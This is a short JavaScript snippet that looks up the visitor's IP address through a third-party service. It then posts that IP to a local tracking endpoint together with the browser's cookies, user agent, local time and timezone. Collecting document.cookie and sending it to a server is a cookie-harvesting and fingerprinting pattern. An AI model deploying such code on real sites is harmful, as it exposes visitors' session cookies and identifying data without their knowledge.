// Fetch the user's IP address from a third-party service
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;

    // Send the collected data to your server
    fetch('http://localhost:3000/track', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        ipAddress: ipAddress,            // IP address collected
        cookies: document.cookie,        // Collect cookies from the browser
        userAgent: navigator.userAgent,  // User agent string
        localTime: new Date().toLocaleString(), // Client's local time
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // Client's timezone
      })
    })
    .then(response => response.json())
    .then(data => console.log('Data sent:', data))
    .catch(error => console.error('Error sending data:', error));
  })
  .catch(error => console.error('Error fetching IP address:', error));